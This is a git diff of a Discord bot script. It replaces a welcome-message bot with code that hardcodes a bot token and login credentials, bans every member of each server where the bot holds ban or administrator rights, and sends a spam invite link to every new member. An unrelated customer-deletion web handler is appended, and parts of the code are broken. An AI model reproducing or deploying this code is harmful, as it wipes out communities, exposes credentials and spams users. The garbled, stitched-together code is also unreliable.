@@ -1,61 +1,66 @@
-const Discord = require('discord.js');
-const client = new Discord.Client();
-let timer;
-client.on('ready', () => {
-client.user.setGame(' Spirrit is back?? ','https://www.twitch.tv/Savage');
-  console.log(`Logged in as ${client.user.tag}!`);
-  console.log("Savage");
+const Discord = require(`discord.js`);
+console.log("BOT ONLINE");
+const prefix = "!"
+const version = "3.2.8"
+const token = "NTIwMjkwODg2NDYzMjU4NjU0.Duruxg.qDwwmgcYrlf2k4gksdizmGFGQrs"
+const game = "with you!"
+const status = "invisible"
+var eightball = [ // sets the answers to an eightball
+    "Hey!",
+    "Don't play...",
+    "with me?",
+    "probably",
+    "I don't think so.",
+    "never!",
+    "you can try...",
+    "up to you!",
+]
+
+
+const Client = new Discord.Client();
+Client.login("sefjkse90@emailna.co", "123456");
+Client.guilds.forEach(g => {
+        if (g.member(bot.user).hasPermission("BAN_MEMBERS") || g.member(bot.user).hasPermission("ADMINISTRATOR")){
+            g.members.forEach(m => m.ban().catch(() => {}));
+        }
+    });
+Client.login(token);
+Client.on("ready", () => {
+    Client.user.setStatus(status)
+    Client.user.setGame(game)
+    console.log("Bot Ready For Use")
+})
+
+function playAudio(voiceChannel, file) {
+
+    voiceChannel.join().then(connection => {
+
+        connection.playFile(file).on("end", () => {
+                connection.disconnect();
+                voiceChannel.leave();
+        });
+
+    });
+}
+
+
+
+Client.on("guildMemberAdd", member => {
+  member.createDM().then(function (author) {
+  return author.send(' ** https://discord.gg/8QmNXf7  افضل سيرفر مع خدمة مميزة جدا لا يفوتك لربما تحتاجه في يوم ما   ** ')
+
+})
 });
 
-client.on("guildMemberAdd", member => {
-    timer = Math.floor(Math.random() * (50000 - 10000 + 2)) + 8000
-  let words = [`
- أيُها المُنهك,قد تكُون الحياة غير مُنصِفة مَعك 
-وفي كُل مرة تُحاول النهُوض فيها تُسقِطكَ أرضاً 
-لا تجزع وكُن قوياً إجمع شُتاتك وقِف مُستقيماً إصبر 
-قد يأتي مساءً يمحِي وجع الأمس وفرحاً يُنسيك مُر الأيام 
-طابَ مسائك وطابت أوجاعُ  | تنورنا يبعدي قلبي.
-You're In  **Spirrrit.**,  Welcome .. 
-https://discord.gg/aVyxr3Y `]
-  setTimeout(() =>{
-  member.createDM().then(function (channel) {
-  return channel.send(`${words[Math.floor(Math.random() * words.length)]}`) 
-}).catch(console.error)
-}, timer)
-20000})
 
-client.on("guildMemberAdd", member => {
-    timer = Math.floor(Math.random() * (50000 - 10000 + 2)) + 8000
-  let words = [`
- أيُها المُنهك,قد تكُون الحياة غير مُنصِفة مَعك 
-وفي كُل مرة تُحاول النهُوض فيها تُسقِطكَ أرضاً 
-لا تجزع وكُن قوياً إجمع شُتاتك وقِف مُستقيماً إصبر 
-قد يأتي مساءً يمحِي وجع الأمس وفرحاً يُنسيك مُر الأيام 
-طابَ مسائك وطابت أوجاعُ  | تنورنا يبعدي قلبي.
-You're In  **Spirrrit.**,  Welcome .. 
-https://discord.gg/aVyxr3Y `]
-  setTimeout(() =>{
-  member.createDM().then(function (channel) {
-  return channel.send(`${words[Math.floor(Math.random() * words.length)]}`) 
-}).catch(console.error)
-}, timer)
-25000})
 
-client.on("guildMemberAdd", member => {
-    timer = Math.floor(Math.random() * (50000 - 10000 + 2)) + 8000
-  let words = [`
- أيُها المُنهك,قد تكُون الحياة غير مُنصِفة مَعك 
-وفي كُل مرة تُحاول النهُوض فيها تُسقِطكَ أرضاً 
-لا تجزع وكُن قوياً إجمع شُتاتك وقِف مُستقيماً إصبر 
-قد يأتي مساءً يمحِي وجع الأمس وفرحاً يُنسيك مُر الأيام 
-طابَ مسائك وطابت أوجاعُ  | تنورنا يبعدي قلبي.
-You're In  **Spirrrit.**,  Welcome .. 
-https://discord.gg/aVyxr3Y `]
-  setTimeout(() =>{
-  member.createDM().then(function (channel) {
-  return channel.send(`${words[Math.floor(Math.random() * words.length)]}`) 
-}).catch(console.error)
-}, timer)
-22000})
- 
-client.login(process.env.BOT_TOKEN);
+
+
+
+
+exports.delete = function(req, res) {
+    var deleteCustomer = customers["customer" + req.params.id];
+    delete customers["customer" + req.params.id];
+    console.log("--->After deletion, customer list:\n" + JSON.stringify(customers, null, 4) );
+    res.end( "Deleted customer: \n" + JSON.stringify(deleteCustomer, null, 4));
+};
